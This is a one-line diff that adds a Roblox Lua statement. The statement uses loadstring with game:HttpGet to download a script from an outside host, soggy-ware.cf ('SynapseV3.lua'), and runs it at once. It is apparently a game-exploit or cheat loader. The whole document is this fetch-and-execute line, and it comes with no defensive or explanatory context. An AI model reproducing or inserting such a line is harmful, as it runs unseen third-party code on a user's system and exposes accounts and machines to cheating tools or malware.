@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://soggy-ware.cf/Side/SynapseV3.lua"))()
